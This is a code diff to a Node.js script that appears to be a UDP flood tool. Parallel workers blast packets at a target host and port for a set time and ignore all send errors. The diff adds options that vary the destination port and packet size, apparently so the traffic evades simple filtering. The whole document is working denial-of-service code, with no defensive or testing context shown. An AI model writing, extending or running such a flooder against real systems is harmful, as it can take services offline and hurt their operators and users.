@@ -5,6 +5,8 @@ const PORT = parseInt(process.env.PORT || '443', 10);
 const SEC = parseInt(process.env.SEC || '60', 10);
 const W = parseInt(process.env.WORKERS || '4', 10);
 const SIZE = parseInt(process.env.SIZE || '1400', 10);
+const RANDPORT = process.env.RANDPORT === '1';
+const RANDSIZE = process.env.RANDSIZE === '1';
 const buf = Buffer.alloc(SIZE, 65);
 let sent = 0, bytes = 0;
 const t0 = Date.now(), end = t0 + SEC * 1000;
@@ -13,7 +15,8 @@ function worker() {
   s.on('error', () => {});
   const loop = () => {
     if (Date.now() > end) { try { s.close(); } catch (e) {} return; }
-    for (let n = 0; n < 32; n++) { try { s.send(buf, 0, SIZE, PORT, HOST); sent++; bytes += SIZE; } catch (e) {} }
+    let n2 = 0;
+    for (let n = 0; n < 32; n++) { n2++; const sz = RANDSIZE ? (64 + ((n2 * 7919) % 1337)) : SIZE; const prt = RANDPORT ? (1024 + ((n2 * 6151) % 64000)) : PORT; try { s.send(buf, 0, sz, prt, HOST); sent++; bytes += sz; } catch (e) {} }
     setImmediate(loop);
   };
   loop();
